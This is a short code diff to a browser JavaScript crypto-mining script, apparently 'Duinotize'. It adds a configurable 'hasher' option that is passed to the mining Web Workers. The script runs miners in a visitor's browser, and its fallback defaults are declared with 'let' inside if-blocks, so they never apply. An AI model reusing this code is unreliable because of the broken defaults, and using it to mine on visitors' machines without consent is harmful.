@@ -13,6 +13,10 @@ threads = document
     .getElementById("duinotize-config")
     .getAttribute("threads");
 
+hasher = document
+    .getElementById("duinotize-config")
+    .getAttribute("hasher");
+
 if ( !username ) {
     console.log("No mining username specified! Coins will be sent to Duinotize developer rpinews.")
     let username = "rpinews";
@@ -30,11 +34,15 @@ if ( !threads ) {
     let threads = 1;
 }
 
+if ( !hasher ) {
+    let hasher = "DUCO-S1";
+}
+
 wallet_id = Math.floor(Math.random() * 2811);
 let workerVer = 0;
 
 for (let workersAmount = 0; workersAmount < threads; workersAmount++) {
     let socketWorker = new Worker("main.js");
-    socketWorker.postMessage('Start,' + username + "," + rigid + "," + wallet_id + "," + difficulty + "," + workerVer);
+    socketWorker.postMessage('Start,' + username + "," + rigid + "," + wallet_id + "," + difficulty + "," + workerVer + "," + hasher);
     workerVer++;
 }
